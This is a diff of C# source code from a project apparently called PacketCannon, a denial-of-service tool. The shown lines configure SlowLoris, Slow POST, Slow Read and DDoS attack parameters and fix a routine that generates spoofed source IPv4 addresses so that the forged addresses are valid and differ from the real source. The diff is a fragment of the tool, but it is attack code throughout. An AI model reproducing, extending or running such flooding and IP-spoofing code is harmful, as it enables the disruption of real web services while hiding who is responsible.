@@ -25,21 +25,21 @@ namespace PacketCannon
         public static PacketCommunicator Communicator;
         public PacketDevice SelectedDevice { get; set; }
         private Attacks? _attackMode = Attacks.SlowLoris;
-        public int SenderSize = 500;
+        public int SenderSize;
         public bool Terminate = false;
         public string HostAddress;
-        public int SenderTimeOut = 0;
-        public int SenderWaveTimeOut = 0;
-        public int SourcePort = 5000;
-        public int PortStep = 1;
+        public int SenderTimeOut;
+        public int SenderWaveTimeOut;
+        public int SourcePort;
+        public int PortStep;
         public MacAddress SourceMac { get; set; }
         public MacAddress DestinationMac { get; set; }
-        public int SlowPostContentLength = 1000000;
-        public string SlowLorisKeepAliveData = "X-a: b";
+        public int SlowPostContentLength;
+        public string SlowLorisKeepAliveData;
         public string SlowLorisHeader;
         public string SlowPostHeader;
-        public string SlowReadUrl = @"/index.html";
-        public int SlowReadWindowSize = 10;
+        public string SlowReadUrl;
+        public int SlowReadWindowSize;
         public static List<IpV4Address> FakeIpV4Addresses;
         public bool Ddos = false;
         public int DdosCount = 5;
@@ -244,8 +244,9 @@ namespace PacketCannon
 
             while (FakeIpV4Addresses.Count != count)
             {
-                var ipAddressFaked = new IpV4Address(ipAddress[0] + ipAddress[1] + ipAddress[2] + rnd.Next(FakeIpAddressMin, FakeIpAddressMax));
-                if (!FakeIpV4Addresses.Contains(ipAddressFaked))
+                var ipAddressFaked = new IpV4Address($"{ipAddress[0]}.{ipAddress[1]}.{ipAddress[2]}.{rnd.Next(FakeIpAddressMin, FakeIpAddressMax)}");
+                //var ipAddressFaked = new IpV4Address(ipAddress[0] + ipAddress[1] + ipAddress[2] + rnd.Next(FakeIpAddressMin, FakeIpAddressMax));
+                if (!FakeIpV4Addresses.Contains(ipAddressFaked) && ipAddressFaked.ToString() != SourceIpv4)
                 {
                     FakeIpV4Addresses.Add(ipAddressFaked);
                 }
